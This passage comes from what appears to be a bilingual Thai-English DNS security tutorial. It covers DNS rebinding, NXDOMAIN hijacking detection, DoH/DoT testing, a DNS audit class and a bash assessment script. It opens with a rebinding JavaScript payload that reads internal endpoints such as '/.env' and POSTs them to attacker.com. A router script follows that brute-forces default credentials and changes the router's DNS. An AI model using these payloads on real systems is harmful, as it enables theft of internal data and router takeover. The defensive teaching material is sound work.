    // Wait for DNS to rebind
    await new Promise(r => setTimeout(r, 2000));
    
    // Now fetch from 'same origin' which is actually internal IP
    const endpoints = [
        '/',
        '/admin',
        '/api/v1/users',
        '/router/status',
        '/.env',
    ];
    
    const results = {{}};
    
    for (const endpoint of endpoints) {{
        try {{
            const resp = await fetch(`http://{self.domain}${{endpoint}}`, {{
                credentials: 'include'
            }});
            results[endpoint] = {{
                status: resp.status,
                body: await resp.text()
            }};
        }} catch (e) {{
            results[endpoint] = {{ error: e.message }};
        }}
    }}
    
    // Exfiltrate results to attacker
    fetch('https://attacker.com/collect', {{
        method: 'POST',
        body: JSON.stringify(results)
    }});
}}

dnsRebindingAttack();
"""
    
    def demonstrate_router_attack(self) -> str:
        """Demonstrate DNS rebinding against home router"""
        return """
// Target: Home router admin (192.168.1.1)
// Step 1: Victim visits malicious site (attacker.evil.com)
// Step 2: DNS resolves to attacker's server
// Step 3: Malicious JS served to victim
// Step 4: JS waits for DNS to rebind to 192.168.1.1
// Step 5: JS makes requests to router (bypasses SOP)
// Step 6: JS changes router DNS to attacker-controlled DNS

async function compromiseRouter() {
    const routerIP = '192.168.1.1';
    
    // Try default credentials
    const creds = [['admin','admin'], ['admin','password'], ['admin', '']];
    
    for (const [user, pass] of creds) {
        try {
            // Basic auth attempt to router
            const resp = await fetch(`http://${routerIP}/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `username=${user}&password=${pass}`,
                credentials: 'include'
            });
            
            if (resp.ok || resp.redirected) {
                // Change DNS settings
                await fetch(`http://${routerIP}/dns_settings`, {
                    method: 'POST',
                    body: 'dns1=attacker_ip&dns2=attacker_ip'
                });
                console.log('Router DNS changed!');
                break;
            }
        } catch (e) {}
    }
}
"""


# Defense against DNS rebinding
DNS_REBIND_DEFENSE = '''
# DNS Rebinding Defenses

## Server-side (Web Application)
# 1. Check Host header
@app.before_request
def check_host():
    allowed_hosts = ['myapp.com', 'www.myapp.com', 'localhost']
    if request.host.split(':')[0] not in allowed_hosts:
        abort(400, "Invalid host header")

# 2. Require CSRF tokens

## DNS Resolver Level
# Unbound: block private IP responses from public domains
private-address: 192.168.0.0/16
private-address: 10.0.0.0/8
private-address: 172.16.0.0/12
private-address: 127.0.0.0/8

## Network Level
# Block inbound DNS responses containing private IPs
# from public DNS queries at firewall

## Browser Level
# Firefox: set network.dns.disableIPv6=true
# Chrome: --host-resolver-rules="MAP *.evil.com 127.0.0.1"
'''
```

---

## Step 398: Advanced DNS Attacks (NXDOMAIN hijacking, Wild card)

```python
import dns.resolver
import dns.query
import dns.message
import socket
import random
from typing import Dict, List, Optional

class AdvancedDNSAttacks:
    """Advanced DNS attack techniques"""
    
    def detect_nxdomain_hijacking(self, resolver: str, 
                                   test_domains: List[str] = None) -> Dict:
        """ตรวจหา NXDOMAIN hijacking (เย็นแปเว็บโฆษณา)"""
        if test_domains is None:
            # Random domains ที่ไม่น่าจะมี registration
            test_domains = [
                f'definitelynotregistered{random.randint(100000,999999)}.com',
                f'thisdoesnotexist{random.randint(100000,999999)}.net',
            ]
        
        result = {
            'resolver': resolver,
            'hijacking_detected': False,
            'test_results': []
        }
        
        custom_resolver = dns.resolver.Resolver(configure=False)
        custom_resolver.nameservers = [resolver]
        
        for domain in test_domains:
            test_result = {'domain': domain, 'hijacked': False, 'response_ip': None}
            
            try:
                answers = custom_resolver.resolve(domain, 'A')
                # Should be NXDOMAIN, but got an answer!
                ips = [str(r) for r in answers]
                test_result['hijacked'] = True
                test_result['response_ip'] = ips[0] if ips else None
                result['hijacking_detected'] = True
                print(f"[!] NXDOMAIN hijacking: {domain} -> {ips}")
            except dns.resolver.NXDOMAIN:
                print(f"Correct NXDOMAIN: {domain}")
            except Exception as e:
                test_result['error'] = str(e)
            
            result['test_results'].append(test_result)
        
        return result
    
    def test_dns_over_https(self, domain: str, doh_servers: List[str] = None) -> Dict:
        """ทดสอบ DNS over HTTPS (DoH)"""
        if doh_servers is None:
            doh_servers = [
                'https://cloudflare-dns.com/dns-query',
                'https://dns.google/dns-query',
                'https://doh.opendns.com/dns-query',
            ]
        
        import urllib.request
        import json
        
        results = {}
        
        for server in doh_servers:
            try:
                url = f"{server}?name={domain}&type=A"
                req = urllib.request.Request(
                    url,
                    headers={'Accept': 'application/dns-json'}
                )
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = json.loads(resp.read())
                
                answers = [
                    {'name': a.get('name'), 'data': a.get('data')}
                    for a in data.get('Answer', [])
                ]
                results[server] = {'success': True, 'answers': answers}
                print(f"DoH {server}: {answers}")
            except Exception as e:
                results[server] = {'success': False, 'error': str(e)}
        
        return results
    
    def test_dns_over_tls(self, domain: str, dot_server: str = '1.1.1.1',
                          port: int = 853) -> Optional[List[str]]:
        """ทดสอบ DNS over TLS (DoT)"""
        import ssl
        
        try:
            context = ssl.create_default_context()
            
            with socket.create_connection((dot_server, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=dot_server) as ssl_sock:
                    # Build DNS query
                    import struct
                    query_id = random.randint(1, 65535)
                    
                    # Simple A query
                    qname = b''
                    for label in domain.split('.'):
                        qname += struct.pack('B', len(label)) + label.encode()
                    qname += b'\x00'
                    
                    query = struct.pack('!HHHHHH', query_id, 0x0100, 1, 0, 0, 0)
                    query += qname
                    query += struct.pack('!HH', 1, 1)  # A, IN
                    
                    # DoT requires 2-byte length prefix
                    query_with_len = struct.pack('!H', len(query)) + query
                    ssl_sock.send(query_with_len)
                    
                    # Receive response
                    response_len = struct.unpack('!H', ssl_sock.recv(2))[0]
                    response = ssl_sock.recv(response_len)
                    
                    print(f"DoT response received: {len(response)} bytes")
                    return [dot_server]
        except Exception as e:
            print(f"DoT error: {e}")
            return None
    
    def test_dns_spoofing_via_bgp(self) -> str:
        """BGP hijacking เพื่อ DNS spoofing (educational)"""
        explanation = """
BGP Hijacking for DNS Spoofing:

1. Attacker announces more specific BGP route for DNS server's IP range
   Example: Authoritative DNS for example.com is at 1.2.3.4/24
   Attacker announces 1.2.3.0/26 (more specific)

2. Traffic to DNS server gets rerouted to attacker's AS

3. Attacker responds to DNS queries with spoofed records

4. Victims receive malicious IP for legitimate domains

Historical examples:
- 2010: China Telecom hijacked US military/government routes
- 2018: BGP hijack redirected Amazon Route 53 DNS queries
- 2019: BGP hijack of Google and others through Nigeria Telecom

Defenses:
- RPKI (Resource Public Key Infrastructure)
- BGPsec
- IRR filtering
- MANRS compliance
"""
        return explanation


# DNS security tools
DNS_TOOLS_REFERENCE = '''
# DNS Security Testing Tools

# dnsx - Fast DNS resolver
echo "www admin dev staging" | dnsx -d target.com -a -resp
cat domains.txt | dnsx -resp-only -a

# massdns - Massive resolver
massdns -r resolvers.txt -t A -o S subdomains.txt > results.txt

# fierce - DNS zone scanner
fierce --domain example.com --subdomains subdomains.txt --traverse 5

# amass - Comprehensive enumeration
amass enum -d example.com -brute -w wordlist.txt -o output.txt
amass intel -d example.com -whois
amass track -d example.com  # Track changes

# dnsenum
dnsenum --enum -p 0 -s 0 --noreverse -o output.xml example.com

# dnsrecon
dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t brt
dnsrecon -d example.com -t axfr
dnsrecon -r 192.168.1.0/24 -t ptr

# subfinder
subfinder -d example.com -o subdomains.txt -all
subfinder -d example.com -sources shodan,virustotal

# shuffledns
shuffledns -d example.com -list subdomains.txt -r resolvers.txt

# dnsspider
python3 dnsspider.py -t example.com -w wordlist.txt
'''
```

---

## Step 399: DNS Security Audit และ Hardening

```python
import dns.resolver
import dns.zone
from typing import Dict, List
import re

class DNSSecurityAuditor:
    """DNS Security Audit and Hardening"""
    
    def full_audit(self, domain: str) -> Dict:
        """ตรวจสอบ DNS security ทั้งหมด"""
        audit_results = {
            'domain': domain,
            'score': 100,
            'checks': {},
            'findings': [],
            'recommendations': []
        }
        
        checks = [
            ('spf', self._check_spf),
            ('dkim', self._check_dkim_exists),
            ('dmarc', self._check_dmarc),
            ('dnssec', self._check_dnssec),
            ('zone_transfer', self._check_zone_transfer_blocked),
            ('caa', self._check_caa),
            ('ns_count', self._check_ns_count),
            ('soa_consistency', self._check_soa),
        ]
        
        for check_name, check_func in checks:
            try:
                result = check_func(domain)
                audit_results['checks'][check_name] = result
                
                if not result.get('pass', False):
                    penalty = result.get('penalty', 10)
                    audit_results['score'] -= penalty
                    audit_results['findings'].extend(result.get('issues', []))
                    audit_results['recommendations'].extend(
                        result.get('recommendations', [])
                    )
            except Exception as e:
                audit_results['checks'][check_name] = {'error': str(e)}
        
        audit_results['score'] = max(0, audit_results['score'])
        return audit_results
    
    def _check_spf(self, domain: str) -> Dict:
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            for rdata in answers:
                txt = str(rdata).strip('"')
                if txt.startswith('v=spf1'):
                    if '-all' in txt:
                        return {'pass': True, 'value': txt}
                    elif '~all' in txt:
                        return {'pass': False, 'penalty': 5,
                                'issues': ['SPF using ~all (soft fail) instead of -all'],
                                'recommendations': ['Change SPF policy to -all']}
                    else:
                        return {'pass': False, 'penalty': 15,
                                'issues': ['SPF has permissive policy'],
                                'recommendations': ['Use -all in SPF record']}
            return {'pass': False, 'penalty': 20,
                    'issues': ['No SPF record'],
                    'recommendations': ['Add SPF record: v=spf1 include:... -all']}
        except Exception:
            return {'pass': False, 'penalty': 20, 'issues': ['SPF check failed']}
    
    def _check_dkim_exists(self, domain: str) -> Dict:
        common_selectors = ['google', 'default', 's1', 'k1', 'mail']
        for selector in common_selectors:
            try:
                dns.resolver.resolve(f"{selector}._domainkey.{domain}", 'TXT')
                return {'pass': True, 'selector': selector}
            except Exception:
                pass
        return {'pass': False, 'penalty': 15,
                'issues': ['No DKIM record found'],
                'recommendations': ['Implement DKIM signing']}
    
    def _check_dmarc(self, domain: str) -> Dict:
        try:
            answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
            for rdata in answers:
                txt = str(rdata).strip('"')
                if txt.startswith('v=DMARC1'):
                    if 'p=reject' in txt:
                        return {'pass': True, 'policy': 'reject'}
                    elif 'p=quarantine' in txt:
                        return {'pass': False, 'penalty': 5,
                                'issues': ['DMARC policy is quarantine, not reject'],
                                'recommendations': ['Upgrade to p=reject']}
                    else:
                        return {'pass': False, 'penalty': 20,
                                'issues': ['DMARC policy is none (no enforcement)'],
                                'recommendations': ['Set DMARC p=quarantine then p=reject']}
            return {'pass': False, 'penalty': 20, 'issues': ['No DMARC record']}
        except Exception:
            return {'pass': False, 'penalty': 20, 'issues': ['No DMARC record']}
    
    def _check_dnssec(self, domain: str) -> Dict:
        try:
            dns.resolver.resolve(domain, 'DNSKEY')
            return {'pass': True}
        except dns.resolver.NoAnswer:
            return {'pass': False, 'penalty': 15,
                    'issues': ['DNSSEC not implemented'],
                    'recommendations': ['Enable DNSSEC signing']}
        except Exception as e:
            return {'pass': False, 'penalty': 5, 'issues': [str(e)]}
    
    def _check_zone_transfer_blocked(self, domain: str) -> Dict:
        ns_records = []
        try:
            answers = dns.resolver.resolve(domain, 'NS')
            ns_records = [str(r).rstrip('.') for r in answers]
        except Exception:
            pass
        
        vulnerable_ns = []
        for ns in ns_records[:3]:  # Check first 3 NS
            try:
                ns_ips = dns.resolver.resolve(ns, 'A')
                for ns_ip in ns_ips:
                    try:
                        zone = dns.zone.from_xfr(
                            dns.query.xfr(str(ns_ip), domain, timeout=5)
                        )
                        if zone:
                            vulnerable_ns.append(ns)
                    except Exception:
                        pass
            except Exception:
                pass
        
        if vulnerable_ns:
            return {'pass': False, 'penalty': 25,
                    'issues': [f'Zone transfer allowed from: {vulnerable_ns}'],
                    'recommendations': ['Block zone transfers: allow-transfer { none; };']}
        return {'pass': True}
    
    def _check_caa(self, domain: str) -> Dict:
        try:
            dns.resolver.resolve(domain, 'CAA')
            return {'pass': True}
        except dns.resolver.NoAnswer:
            return {'pass': False, 'penalty': 5,
                    'issues': ['No CAA record - any CA can issue certificates'],
                    'recommendations': ['Add CAA record: 0 issue "letsencrypt.org"']}
        except Exception as e:
            return {'pass': False, 'penalty': 5, 'issues': [str(e)]}
    
    def _check_ns_count(self, domain: str) -> Dict:
        try:
            answers = dns.resolver.resolve(domain, 'NS')
            ns_count = len(list(answers))
            if ns_count < 2:
                return {'pass': False, 'penalty': 10,
                        'issues': [f'Only {ns_count} nameserver(s) - no redundancy'],
                        'recommendations': ['Use at least 2 nameservers in different locations']}
            return {'pass': True, 'count': ns_count}
        except Exception as e:
            return {'pass': False, 'penalty': 5, 'issues': [str(e)]}
    
    def _check_soa(self, domain: str) -> Dict:
        try:
            answers = dns.resolver.resolve(domain, 'SOA')
            for soa in answers:
                issues = []
                if soa.refresh < 3600:
                    issues.append(f'SOA refresh too low: {soa.refresh}s')
                if soa.expire < 604800:
                    issues.append(f'SOA expire too low: {soa.expire}s')
                if soa.retry >= soa.refresh:
                    issues.append('SOA retry >= refresh (bad configuration)')
                
                if issues:
                    return {'pass': False, 'penalty': 5, 'issues': issues,
                            'recommendations': ['Set refresh=3600, retry=900, expire=604800']}
                return {'pass': True}
        except Exception as e:
            return {'pass': False, 'penalty': 5, 'issues': [str(e)]}
    
    def generate_report(self, audit_results: Dict) -> str:
        """Generate DNS security audit report"""
        domain = audit_results['domain']
        score = audit_results['score']
        grade = 'A' if score >= 90 else 'B' if score >= 80 else 'C' if score >= 70 else 'D' if score >= 60 else 'F'
        
        report = f"""
=== DNS Security Audit Report ===
Domain: {domain}
Score: {score}/100 (Grade: {grade})

Findings:
"""
        for finding in audit_results['findings']:
            report += f"  [!] {finding}\n"
        
        report += "\nRecommendations:\n"
        for rec in audit_results['recommendations']:
            report += f"  [*] {rec}\n"
        
        return report
```

---

## Step 400: DNS Security Tools และ Automation

```bash
#!/bin/bash
# DNS Security Automation Script

DOMAIN="$1"
[[ -z "$DOMAIN" ]] && echo "Usage: $0 <domain>" && exit 1

echo "=== DNS Security Assessment: $DOMAIN ==="
REPORT_FILE="/tmp/dns_audit_${DOMAIN}.txt"

# 1. Basic Records
echo "\n[1] Basic DNS Records" | tee -a $REPORT_FILE
dig ANY $DOMAIN +short 2>/dev/null | tee -a $REPORT_FILE

# 2. Zone Transfer
echo "\n[2] Zone Transfer Test" | tee -a $REPORT_FILE
for NS in $(dig NS $DOMAIN +short); do
    echo "Testing AXFR from $NS:" | tee -a $REPORT_FILE
    dig AXFR $DOMAIN @$NS 2>&1 | head -5 | tee -a $REPORT_FILE
done

# 3. SPF/DKIM/DMARC
echo "\n[3] Email Authentication" | tee -a $REPORT_FILE
dig TXT $DOMAIN +short | grep -E 'spf|DKIM' | tee -a $REPORT_FILE
dig TXT _dmarc.$DOMAIN +short | tee -a $REPORT_FILE

# 4. DNSSEC
echo "\n[4] DNSSEC" | tee -a $REPORT_FILE
dig DNSKEY $DOMAIN +short | tee -a $REPORT_FILE
dig DS $DOMAIN +short | tee -a $REPORT_FILE

# 5. CAA Records
echo "\n[5] CAA Records" | tee -a $REPORT_FILE
dig CAA $DOMAIN +short | tee -a $REPORT_FILE

# 6. Subdomain Enumeration
echo "\n[6] Subdomain Enumeration (top 20)" | tee -a $REPORT_FILE
if command -v subfinder &>/dev/null; then
    subfinder -d $DOMAIN -silent 2>/dev/null | head -20 | tee -a $REPORT_FILE
fi

# 7. Certificate Transparency
echo "\n[7] Certificate Transparency" | tee -a $REPORT_FILE
curl -s "https://crt.sh/?q=%.${DOMAIN}&output=json" 2>/dev/null | \
    python3 -c "import sys,json; data=json.load(sys.stdin); \
    [print(c['name_value']) for c in data[:20]]" 2>/dev/null | \
    sort -u | tee -a $REPORT_FILE

# 8. DNS over HTTPS test
echo "\n[8] DNS over HTTPS" | tee -a $REPORT_FILE
curl -s "https://cloudflare-dns.com/dns-query?name=${DOMAIN}&type=A" \
     -H 'Accept: application/dns-json' | \
     python3 -c "import sys,json; d=json.load(sys.stdin); \
     [print(a['data']) for a in d.get('Answer',[])]" 2>/dev/null | tee -a $REPORT_FILE

# 9. Check for wildcards
echo "\n[9] Wildcard DNS Check" | tee -a $REPORT_FILE
RANDOM_SUB="notexist$(date +%s)test"
dig A ${RANDOM_SUB}.${DOMAIN} +short | tee -a $REPORT_FILE

# 10. nmap DNS scripts
echo "\n[10] Nmap DNS Scripts" | tee -a $REPORT_FILE
NS_IP=$(dig NS $DOMAIN +short | head -1 | xargs dig +short)
if [[ -n "$NS_IP" ]]; then
    nmap -p53 --script dns-brute,dns-recursion,dns-service-discovery \
         --script-args dns-brute.domain=$DOMAIN $NS_IP 2>/dev/null | \
         grep -v '^#' | tee -a $REPORT_FILE
fi

echo "\n=== Assessment Complete ==="
echo "Report saved to: $REPORT_FILE"
```

---

## สรุป Part 40

- **Step 391**: DNS Recon และ Zone Transfer - nameserver enum, AXFR attempt, reverse lookup
- **Step 392**: Subdomain Enumeration - async brute force, CT logs, CNAME takeover detection
- **Step 393**: DNS Cache Poisoning - Kaminsky attack simulation, cache poisoning detection
- **Step 394**: DNSSEC Testing - DNSKEY/DS/RRSIG validation, algorithm strength
- **Step 395**: DNS Amplification - factor calculation, open resolver finder, rate limiting test
- **Step 396**: DNS Tunneling - implementation, detection via entropy analysis
- **Step 397**: DNS Rebinding - attack server, malicious JS, router attack demo
- **Step 398**: Advanced Attacks - NXDOMAIN hijacking, DoH/DoT testing, BGP hijacking
- **Step 399**: DNS Security Audit - comprehensive scoring, SPF/DKIM/DMARC/DNSSEC/CAA
- **Step 400**: DNS Tools และ Automation - subfinder, dnsx, massdns, dnsrecon
